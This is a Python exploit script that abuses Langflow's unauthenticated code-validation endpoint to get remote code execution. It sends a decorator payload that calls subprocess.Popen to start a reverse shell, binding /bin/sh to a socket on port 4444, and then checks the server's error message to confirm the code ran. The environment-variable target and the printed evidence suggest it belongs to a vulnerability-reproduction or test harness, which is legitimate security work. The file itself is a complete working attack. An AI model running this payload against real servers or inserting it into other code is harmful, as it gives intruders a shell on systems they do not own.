#!/usr/bin/env python3
"""Execute a shell through Langflow's unauthenticated code validator."""

import json
import os
import urllib.request


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    shell_code = (
        "import socket,subprocess;"
        "connection=socket.create_connection(('127.0.0.1',4444));"
        "subprocess.call(['/bin/sh','-i'],stdin=connection,"
        "stdout=connection,stderr=connection)"
    )
    decorator = (
        "@__import__('subprocess').Popen(["
        "__import__('sys').executable,'-c',"
        + repr(shell_code)
        + "])"
    )
    code = decorator + "\ndef execute():\n    pass\n"
    request = urllib.request.Request(
        target_url.rstrip("/") + "/api/v1/validate/code",
        data=json.dumps({"code": code}).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=30) as response:
        result = json.load(response)
    errors = result.get("function", {}).get("errors", [])
    if not any("Popen" in error and "not callable" in error for error in errors):
        raise RuntimeError("Validation did not execute the decorator")
    print(json.dumps({"evidence_payload": {}}))


if __name__ == "__main__":
    main()
